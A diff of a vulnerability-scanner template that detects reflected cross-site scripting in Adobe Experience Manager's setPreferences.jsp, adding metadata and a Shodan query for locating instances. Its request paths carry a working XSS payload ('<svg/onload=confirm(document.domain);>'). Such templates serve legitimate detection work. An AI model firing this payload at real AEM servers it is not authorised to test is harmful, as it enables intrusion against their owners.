@@ -1,5 +1,4 @@
 id: aem-setpreferences-xss
-
 info:
   name: Adobe Experience Manager - Cross-Site Scripting
   author: zinminphy0,dhiyaneshDK
@@ -16,17 +15,16 @@ info:
     cpe: cpe:2.3:a:adobe:experience_manager:*:*:*:*:*:*:*:*
   metadata:
     max-request: 2
+    product: experience_manager
+    shodan-query: http.component:"Adobe Experience Manager"
     vendor: adobe
-  tags: aem,xss,misconfig,vuln
-
+  tags: aem,misconfig,vuln,xss
 http:
   - method: GET
     path:
       - "{{BaseURL}}/crx/de/setPreferences.jsp;%0A.html?language=en&keymap=<svg/onload=confirm(document.domain);>//a"
       - "{{BaseURL}}/content/crx/de/setPreferences.jsp;%0A.html?language=en&keymap=<svg/onload=confirm(document.domain);>//a"
-
     stop-at-first-match: true
-
     matchers-condition: and
     matchers:
       - type: word
@@ -34,8 +32,7 @@ http:
           - "<svg/onload=confirm(document.domain);>"
           - 'A JSONObject text must begin with'
         condition: and
-
       - type: status
         status:
           - 400
-
+        # digest: 490a00463044022033e8f9d0e51678cece886f18206dcc5ad445b4f021bbbd938c8a94692dfd990302207049b77ffaf57f4be444966e8f2b7ad570fd6056eba61a4a46ccbf588caba211:922c64590222798bb761d5b6d8e72950
